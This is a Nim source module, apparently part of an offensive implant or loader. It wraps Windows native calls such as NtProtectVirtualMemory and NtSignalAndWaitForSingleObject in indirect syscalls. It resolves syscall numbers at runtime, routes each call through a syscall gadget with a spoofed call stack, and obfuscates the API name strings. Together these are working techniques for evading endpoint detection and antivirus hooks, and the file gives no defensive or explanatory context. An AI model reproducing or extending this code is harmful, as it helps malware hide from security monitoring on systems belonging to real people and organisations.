import tables
import utils
import ssn
import spoof
import ../global

const currentProcess* = cast[pointer](-1)
const stubMissing* = 0xC0000225'u32

proc ntCall(
  api: string;
  rcx, rdx, r8, r9: pointer;
  s1: pointer = nil; s2: pointer = nil; s3: pointer = nil; s4: pointer = nil;
  s5: pointer = nil; s6: pointer = nil; s7: pointer = nil; s8: pointer = nil
): culong =
  # Here is where the syscall number is resolved and the spoofed call runs
  if not syscallReady:
    discard prepareSyscalls()
  let ssn = ssns.getOrDefault(api)
  if ssn == 0 or syscallGadget == 0:
    return stubMissing
  spoofSyscall(
    ssn, cast[pointer](syscallGadget), rcx, rdx, r8, r9, s1, s2, s3, s4, s5, s6, s7, s8
  )

proc protectVirtualMemory*(procH: pointer; base: ptr pointer; size: ptr csize_t; prot: culong; old: ptr culong): culong =
  # Changes the protection of a virtual memory region
  ntCall(
    obf("NtProtectVirtualMemory"), procH, cast[pointer](base), cast[pointer](size), cast[pointer](prot), old
  )

proc waitForObject*(h: pointer): culong =
  # Waits on a single object until it is signaled
  ntCall(obf("NtWaitForSingleObject"), h, cast[pointer](0), nil, nil)

proc ntCreateEvent*(h: ptr pointer; access: culong; oa: pointer; typ, state: culong): culong =
  # Creates an event and writes its handle
  ntCall(obf("NtCreateEvent"), cast[pointer](h), cast[pointer](access), oa, cast[pointer](typ), cast[pointer](state))

proc ntSetEvent*(ev: pointer; prev: ptr culong = nil): culong =
  # Sets an event to the signaled state
  ntCall(obf("NtSetEvent"), ev, cast[pointer](prev), nil, nil)

proc ntSetEventStub*(): pointer =
  # Returns the syscall stub for NtSetEvent
  getSsn(obf("NtSetEvent"))

proc ntSignalAndWait*(sig, wait: pointer; alert: culong; timeout: pointer): culong =
  # Signals one object and waits on another
  ntCall(obf("NtSignalAndWaitForSingleObject"), sig, wait, cast[pointer](alert), timeout)

proc ntCloseHandle*(h: pointer): culong =
  # Closes a handle when the pointer is not nil
  if h == nil: return 0
  ntCall(obf("NtClose"), h, nil, nil, nil)

proc querySystemInformation*(cls: culong; info: pointer; len: culong; retLen: ptr culong): culong =
  # Queries system information into the given buffer
  ntCall(
    obf("NtQuerySystemInformation"), cast[pointer](cls), info, cast[pointer](len), cast[pointer](retLen)
  )